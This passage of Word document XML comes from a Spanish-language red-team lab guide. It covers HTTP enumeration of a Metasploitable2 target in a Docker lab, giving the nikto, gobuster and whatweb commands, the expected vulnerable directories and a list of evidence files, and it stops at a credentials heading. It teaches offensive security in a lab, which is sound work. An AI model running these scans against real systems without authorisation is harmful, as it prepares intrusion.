      </w:pPr>
    </w:p>
    <w:p w14:paraId="723152C4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Objetivo:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Descubrir directorios y aplicaciones web, detectar vulnerabilidades HTTP conocidas, identificar el stack tecnológico.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69412DC0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Técnicas:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Nikto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (scanner de vulnerabilidades web), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Gobuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (fuerza bruta de directorios), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Whatweb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>fingerprinting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04850508" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Ejecutar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7E1EB50E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-3-enumeration/enum-http.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B14E047" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6AED1048" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Qué hace el script paso a paso</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23968A2D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Nikto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Escaneo automatizado de vulnerabilidades HTTP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613FA91A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>nikto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> -h http://172.20.0.20:80 -o nikto.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62473298" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="606CDD7D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Detecta: versiones desactualizadas, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>headers</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> de seguridad faltantes, directorios expuestos, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>phpinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> expuesto.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B79F04E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Gobuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Descubrimiento de directorios por fuerza bruta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2004CFC2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>gobuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>dir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-u</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> http://172.20.0.20 -w /usr/share/dirb/wordlists/common.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A2FCC5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EC813B7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Whatweb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Fingerprinting del stack tecnológico:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA940F3" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">   whatweb -v http://172.20.0.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="342D9294" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="535D0B9C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Resultado esperado</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33934354" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Directorios descubiertos en Metasploitable2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338AB752" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>/dvwa          — Damn Vulnerable Web App</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA79B67" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>/mutillidae    — Mutillidae (OWASP Top 10 demo)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1801BDB9" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>phpMyAdmin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">    — Administración MySQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D82D10" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>phpinfo.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">   — Información del servidor PHP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214583E6" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>twiki</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">         — Wiki vulnerable</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E1D42B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>dav</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">           — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>WebDAV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> habilitado</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C951F48" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FDDE6B2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Evidencia generada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7C2578" w14:paraId="6B699212" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="2EE82DD5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Archivo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="1C32FEE7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Contenido</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="079BBA0D" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4C15B88C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>nikto.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="78559E02" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Vulnerabilidades y hallazgos HTTP</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="580A4171" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="7C3D39FE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>gobuster.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="53E6CB18" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t xml:space="preserve">Directorios descubiertos con status </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>codes</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="4D275661" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1C7D7135" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>whatweb.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="136CB9FA" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Stack tecnológico identificado</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7929A7AB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578"/>
    <w:p w14:paraId="4E12428E" w14:textId="51CF7346" w:rsidR="007C2578" w:rsidRDefault="005F4B07">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1E8635CC" wp14:editId="0314CE83">
            <wp:extent cx="5972810" cy="6449695"/>
            <wp:effectExtent l="0" t="0" r="8890" b="8255"/>
            <wp:docPr id="1922387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387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644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B9146" w14:textId="501F56D8" w:rsidR="005F4B07" w:rsidRDefault="005F4B07">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5D536E10" wp14:editId="6B43C06E">
            <wp:extent cx="5972810" cy="3590925"/>
            <wp:effectExtent l="0" t="0" r="8890" b="9525"/>
            <wp:docPr id="2648677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8677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0E461" w14:textId="77777777" w:rsidR="005F4B07" w:rsidRDefault="005F4B07">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D90301B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>7. Fase 4 — Credenciales</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F925294" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
